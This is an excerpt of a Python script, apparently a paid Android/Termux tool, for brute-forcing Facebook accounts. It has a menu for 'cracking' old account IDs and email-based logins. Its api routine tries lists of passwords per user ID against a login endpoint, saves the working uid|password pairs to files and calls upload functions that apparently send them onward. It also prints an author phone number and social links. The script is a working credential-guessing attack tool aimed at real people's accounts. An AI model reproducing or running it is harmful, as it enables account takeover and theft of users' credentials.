...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/akashmia2052/approval.txt/blob/main/Ap.txt"])
	exit(" [*] FACEBOOK : Akash Mia")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER Akash Mia")
	subprocess.check_output(["am", "start", "https://m.me/MYMENSINGH.ER.CEO.AKASH.MAHMUD.2023"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/SAKIB420-CYBER/Cyber/blob/main/Cyber.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : akashmia2052
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : +8801832338496
\033[1;90m══════════════════════════════════════════════════
    """)
		...
		print("")
		print("%s [%s01%s]%s CRACK OLD FB ID 2010-2023 %s(PAID) V1[High Speed]"%(R,G,R,Y,G))
		print("%s [%s02%s]%s CRACK OLD FB ID 2005-2009 %s (PAID) V2[High Speed]"%(R,G,R,Y,G))
		print("%s [%s03%s]%s CRACK OLD FB ID Free fire-pubg %s (PAID) V3[Super Slow]"%(R,G,R,Y,G))
		print("%s [%s04%s]%s CRACK FROM EMAILS %s(PAID) [2004]"%(R,G,R,Y,G))
		print(GET)
		hoga = input("\n%s [?] CHOICE : "%(B))
		if hoga in ["", " "]:
			Main()
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [AKASH-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[AKASH-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [AKASH-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
